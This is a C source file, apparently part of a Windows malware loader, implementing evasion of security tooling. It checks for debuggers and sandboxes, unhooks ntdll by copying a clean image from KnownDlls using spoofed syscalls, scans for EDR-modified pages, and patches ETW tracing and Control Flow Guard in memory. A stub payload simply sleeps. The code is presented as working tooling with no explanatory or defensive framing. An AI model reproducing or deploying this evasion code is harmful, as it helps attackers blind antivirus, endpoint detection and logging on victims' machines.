#include "myloader.h"

#define HASH_EtwEventWriteFull 0x1069bb5eab142403

static BOOL GetTextSectionRange(PVOID moduleBase, PVOID* outBase, SIZE_T* outSize) {
    if (!moduleBase || !outBase || !outSize) return FALSE;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if ((*(ULONG*)pSection[i].Name | 0x20202020) == 'xet.') {
            *outBase = (PBYTE)moduleBase + pSection[i].VirtualAddress;
            *outSize = pSection[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}
BOOL CheckEnvironment() {
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA) {
        return FALSE;
    }
    if (pCurrentPeb->BeingDebugged == 1) return FALSE;
    if ((pCurrentPeb->NtGlobalFlag & 0x70) == 0x70) return FALSE;
    if (pCurrentPeb->NumberOfProcessors < 2) return FALSE;
    PVOID pHeap = pCurrentPeb->ProcessHeap;
    if (pHeap) {
        DWORD heapFlags = *(DWORD*)((PBYTE)pHeap + 0x70);
        DWORD heapForceFlags = *(DWORD*)((PBYTE)pHeap + 0x74);
        if (!(heapFlags & 0x2) || heapForceFlags != 0) {
            return FALSE;
        }
    }
    BYTE kdDebuggerEnabled = *(BYTE*)(0x7FFE02D4);
    if (kdDebuggerEnabled & 0x1 || kdDebuggerEnabled & 0x2) {
        return FALSE;
    }

    unsigned __int64 t1, t2;
    t1 = __rdtsc();
    GetTickCount(); 
    t2 = __rdtsc();
    if ((t2 - t1) > 100000) { 
        return FALSE;
    }

    return TRUE;
}

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif
#define PAGE_ALIGN_DOWN(x) ((ULONG_PTR)(x) & ~(PAGE_SIZE - 1))

PVOID FindSyscallGadgetInRange(PVOID pStart, PVOID pEnd) {
    PBYTE pCur = (PBYTE)pStart;
    while ((ULONG_PTR)pCur < (ULONG_PTR)pEnd - 3) {
        // 0F 05 C3 : syscall; ret
        if (pCur[0] == 0x0F && pCur[1] == 0x05 && pCur[2] == 0xC3) {
            return (PVOID)pCur;
        }
        pCur++;
    }
    return NULL;
}

BOOL UnhookNtdll(PVX_TABLE pVxTable) {
    NTSTATUS status = 0;
    HANDLE hSection = NULL;
    PVOID pCleanNtdll = NULL;
    SIZE_T viewSize = 0;
    WCHAR szKnownDllPath[] = { 
        L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\', 
        L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', 0 
    };
    UNICODE_STRING usKnownDllPath;
    VxInitUnicodeString(&usKnownDllPath, szKnownDllPath);

    OBJECT_ATTRIBUTES objAttr = { 0 };
    InitializeObjectAttributes(&objAttr, &usKnownDllPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = InvokeSpoofedSyscall(&pVxTable->NtOpenSection, 3, &hSection, SECTION_MAP_READ, &objAttr);
    if (!NT_SUCCESS(status)) return FALSE;
    status = InvokeSpoofedSyscall(&pVxTable->NtMapViewOfSection, 10,
        hSection, (HANDLE)-1, &pCleanNtdll, 0, 0, NULL, &viewSize, 2, 0, PAGE_READONLY);
    
    InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hSection); 
    if (!NT_SUCCESS(status)) return FALSE;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pCleanNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    if (!g_ntdllBase) return FALSE;
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if ((*(ULONG*)pSection[i].Name | 0x20202020) == 'xet.') {
            ULONG_PTR dirtyStart = (ULONG_PTR)g_ntdllBase + pSection[i].VirtualAddress;
            ULONG_PTR cleanStart = (ULONG_PTR)pCleanNtdll + pSection[i].VirtualAddress;
            SIZE_T size = pSection[i].Misc.VirtualSize;
            ULONG_PTR splitPoint = PAGE_ALIGN_DOWN(dirtyStart + size / 2);
            PVOID pRegion1Base = (PVOID)dirtyStart;
            SIZE_T sRegion1Size = splitPoint - dirtyStart;
            PVOID pClean1Base = (PVOID)cleanStart;
            PVOID pRegion2Base = (PVOID)splitPoint;
            SIZE_T sRegion2Size = (dirtyStart + size) - splitPoint;
            PVOID pClean2Base = (PVOID)(cleanStart + sRegion1Size);
            PVOID pGadgetInRegion2 = FindSyscallGadgetInRange(pRegion2Base, (PVOID)((ULONG_PTR)pRegion2Base + sRegion2Size));
            PVOID pGadgetInRegion1 = FindSyscallGadgetInRange(pRegion1Base, (PVOID)((ULONG_PTR)pRegion1Base + sRegion1Size));

            if (!pGadgetInRegion1 || !pGadgetInRegion2) {
                ERR("[-]Unable to find syscallGadget");
                break;
            }

            ULONG ulOldProtect = 0;
            pVxTable->NtProtectVirtualMemory.pSyscallInst = pGadgetInRegion2;
            status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
                (HANDLE)-1, &pRegion1Base, &sRegion1Size, PAGE_READWRITE, &ulOldProtect);
            
            if (NT_SUCCESS(status)) {
                VxMoveMemory(pRegion1Base, pClean1Base, sRegion1Size);
                InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
                    (HANDLE)-1, &pRegion1Base, &sRegion1Size, ulOldProtect, &ulOldProtect);
            }
            pVxTable->NtProtectVirtualMemory.pSyscallInst = pGadgetInRegion1;
            status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
                (HANDLE)-1, &pRegion2Base, &sRegion2Size, PAGE_READWRITE, &ulOldProtect);
            if (NT_SUCCESS(status)) {
                VxMoveMemory(pRegion2Base, pClean2Base, sRegion2Size);
                InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
                    (HANDLE)-1, &pRegion2Base, &sRegion2Size, ulOldProtect, &ulOldProtect);
            }
            break;
        }
    }
    InvokeSpoofedSyscall(&pVxTable->NtUnmapViewOfSection, 2, (HANDLE)-1, pCleanNtdll);
    return TRUE;
}
BOOL IsNtdllTainted(PVX_TABLE pVxTable) {
    if (!g_ntdllBase) return TRUE; 
    PVOID pTextBase = NULL;
    SIZE_T sTextSize = 0;
    if (!GetTextSectionRange(g_ntdllBase, &pTextBase, &sTextSize)) return TRUE;

    PBYTE pCurrent = (PBYTE)pTextBase;
    PBYTE pEnd = pCurrent + sTextSize;
    
    NTSTATUS status;
    MEMORY_WORKING_SET_EX_INFORMATION memExInfo;

    while (pCurrent < pEnd) {
        memExInfo.VirtualAddress = pCurrent;
        memExInfo.VirtualAttributes.Flags = 0;
        status = InvokeSpoofedSyscall(&pVxTable->NtQueryVirtualMemory, 6,
            (HANDLE)-1,
            pCurrent,
            MemoryWorkingSetExInformation,
            &memExInfo,
            sizeof(memExInfo),
            NULL
        );
        if (NT_SUCCESS(status)) {
            if (memExInfo.VirtualAttributes.Valid && !memExInfo.VirtualAttributes.Shared) {
                LOG("Found Dirty Page at: %p", pCurrent);
                return TRUE;
            }
        }
        pCurrent += 0x1000;
    }
    return FALSE;
}

BOOL PatchEtw(PVX_TABLE pVxTable) {
    if (!g_ntdllBase) return FALSE;
    PVOID pEtwEventWriteFull = GetProcAddressByName(g_ntdllBase, HASH_EtwEventWriteFull);
    if (!pEtwEventWriteFull) return FALSE;
    // 2. 搜索 call 指令 (Opcode: 0xE8)
    PBYTE pSearch = (PBYTE)pEtwEventWriteFull;
    PVOID pTargetFunc = NULL;
    for (int i = 0; i < 64; i++) {
        if (pSearch[i] == 0xE8) {
            LONG offset = *(PLONG)(pSearch + i + 1);
            pTargetFunc = (PVOID)(pSearch + i + 5 + offset);
            break;
        }
    }
    if (!pTargetFunc) return FALSE;
    BYTE patchBytes[] = { 0x33, 0xC0, 0xC3 }; 
    
    PVOID pBaseAddress = pTargetFunc;
    SIZE_T sSize = sizeof(patchBytes);
    ULONG ulOldProtect = 0;
    NTSTATUS status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pBaseAddress, &sSize, PAGE_READWRITE, &ulOldProtect);
    if (!NT_SUCCESS(status)) return FALSE;

    VxMoveMemory(pTargetFunc, patchBytes, sizeof(patchBytes));
    InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pBaseAddress, &sSize, ulOldProtect, &ulOldProtect);
    return TRUE;
}

BOOL PatchCFG(PVX_TABLE pVxTable) {
    if (!g_ntdllBase) return FALSE;
    PVOID pTextBase = NULL;
    SIZE_T sTextSize = 0;
    if (!GetTextSectionRange(g_ntdllBase, &pTextBase, &sTextSize)) return FALSE;

    // 2. 特征码扫描
    // 特征: push rax (0x50); sub rsp, 80h (0x48 0x83 0xEC 0x80)
    BYTE signature[] = { 0x50, 0x48, 0x83, 0xEC, 0x80 };
    PBYTE pScan = (PBYTE)pTextBase;
    PVOID pTargetFunc = NULL;
    if (sTextSize < sizeof(signature)) return FALSE;
    for (SIZE_T i = 0; i + sizeof(signature) <= sTextSize; i++) {
        if (memcmp(pScan + i, signature, sizeof(signature)) == 0) {
            pTargetFunc = pScan + i;
            break; 
        }
    }
    if (!pTargetFunc) return FALSE;
    BYTE patchBytes[] = { 0xFF, 0xE0 }; 

    PVOID pBaseAddress = pTargetFunc;
    SIZE_T sSize = sizeof(patchBytes);
    ULONG ulOldProtect = 0;
    NTSTATUS status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pBaseAddress, &sSize, PAGE_READWRITE, &ulOldProtect);

    if (!NT_SUCCESS(status)) return FALSE;
    VxMoveMemory(pTargetFunc, patchBytes, sizeof(patchBytes));
    InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pBaseAddress, &sSize, ulOldProtect, &ulOldProtect);
    return TRUE;
}

BOOL Payload() {
    InvokeSpoofedApi(djb2((PBYTE)"Sleep"), 1, -600000000LL);
    return TRUE;
}
